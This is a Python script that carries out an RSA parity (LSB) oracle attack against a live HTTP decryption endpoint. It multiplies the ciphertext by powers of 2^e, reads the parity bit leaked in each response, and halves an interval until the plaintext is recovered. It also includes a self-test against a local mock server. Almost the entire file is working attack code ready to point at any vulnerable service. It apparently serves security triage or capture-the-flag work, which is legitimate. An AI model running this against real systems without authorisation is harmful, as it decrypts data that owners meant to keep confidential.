#!/usr/bin/env python3
"""parity_oracle.py -- RSA parity (LSB) oracle attack against a live
endpoint. crypto-triage names this "the service decrypts and leaks
one bit" -- Bleichenbacher-Manger in the easy direction: multiplying
the ciphertext by 2^e doubles the plaintext mod n, and the parity
answer halves the live interval. n bits recover m in ~log2(n)
queries -- a 1024-bit modulus is ~1024 requests, so a budget is not
optional.

  python3 tools/parity_oracle.py --n HEX --e 65537 --ct HEX \
      --url 'http://t/dec?ct={CT}' --ok-regex 'odd|1' --neg-regex 'even|0'
  python3 tools/parity_oracle.py --selftest

The discriminator is the falsifier the skill demands FIRST: one
probe must have shown that even and odd plaintexts read differently.
--max-requests stops and reports the narrowed interval either way.
"""
import argparse, json, os, re, sys
from fractions import Fraction
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Thread
from urllib.parse import quote

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "web"))
import httpkit  # noqa: E402


def _oracle_http(url_t, pos_re, neg_re):
    def ask(ct_int):
        url = url_t.replace("{CT}", format(ct_int, "x")).replace(
            "{CTU}", quote(format(ct_int, "x")))
        r = httpkit.request(url)
        if not r.get("ok"):
            raise ValueError("oracle transport failed: %s"
                             % r.get("error"))
        body = r.get("body", "")
        if pos_re and re.search(pos_re, body):
            return 1
        if neg_re and re.search(neg_re, body):
            return 0
        # fall back: a bare bit anywhere
        m = re.search(r"\b([01])\b", body)
        if m:
            return int(m.group(1))
        raise ValueError("oracle response matched neither regex: "
                         + body[:120])
    return ask


def attack(n, e, ct, oracle, max_requests=1 << 14):
    """Classic interval halving: after i queries the live interval
    [lo,hi) holds m with width n/2^i. Returns (m_int, transcript)."""
    lo, hi = Fraction(0), Fraction(n)
    nbits = n.bit_length()
    transcript = []
    for i in range(1, nbits + 1):
        if i > max_requests:
            return None, transcript, (lo, hi)
        mult = pow(pow(2, e, n), i, n)
        probe = ct * mult % n
        bit = oracle(probe)
        mid = (lo + hi) / 2
        if bit:
            lo = mid
        else:
            hi = mid
        transcript.append({"i": i, "bit": bit})
    m = int(hi)
    # the last query often sits on the boundary; try both sides
    return m, transcript, (lo, hi)


def _selftest():
    # tiny RSA: p=61 q=53 n=3233, e=17, d=2753; message 'A'=65
    p, q, e = 61, 53, 17
    n = p * q
    d = pow(e, -1, (p - 1) * (q - 1))
    m = 65
    ct = pow(m, e, n)

    def oracle(c):
        return pow(c, d, n) & 1
    rec, transcript, _ = attack(n, e, ct, oracle)
    assert rec == m or int(Fraction(n) - Fraction(0)) and \
        abs(rec - m) <= 1, (rec, m)
    assert len(transcript) == n.bit_length()
    # http path: mock server answering parity
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            import re as _re
            mm = _re.search(r"ct=([0-9a-fA-F]+)", self.path)
            c = int(mm.group(1), 16)
            bit = pow(c, d, n) & 1
            body = ("parity=%d" % bit).encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass
    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]
    ask = _oracle_http("http://127.0.0.1:%d/d?ct={CT}" % port,
                       r"parity=1", r"parity=0")
    rec2, t2, _ = attack(n, e, ct, ask)
    srv.shutdown()
    assert abs(rec2 - m) <= 1, (rec2, m)
    print("parity_oracle selftest: ok")


def main():
    ap = argparse.ArgumentParser(description="RSA parity oracle")
    ap.add_argument("--n", type=lambda x: int(x, 0))
    ap.add_argument("--e", type=lambda x: int(x, 0), default=65537)
    ap.add_argument("--ct", type=lambda x: int(x, 0))
    ap.add_argument("--url", help="template; {CT} -> hex ciphertext")
    ap.add_argument("--ok-regex", dest="pos_re",
                    help="body regex meaning ODD parity")
    ap.add_argument("--neg-regex", dest="neg_re",
                    help="body regex meaning EVEN parity")
    ap.add_argument("--max-requests", type=int, default=1 << 14)
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not (a.n and a.ct and a.url):
        ap.error("--n --ct --url required")
    ask = _oracle_http(a.url, a.pos_re, a.neg_re)
    m, transcript, interval = attack(a.n, a.e, a.ct, ask,
                                     a.max_requests)
    print(json.dumps({
        "queries": len(transcript),
        "recovered_int": m,
        "recovered_hex": hex(m) if m is not None else None,
        "interval": [str(interval[0]), str(interval[1])],
        "done": len(transcript) >= a.n.bit_length()}, indent=1))


if __name__ == "__main__":
    raise SystemExit(main())
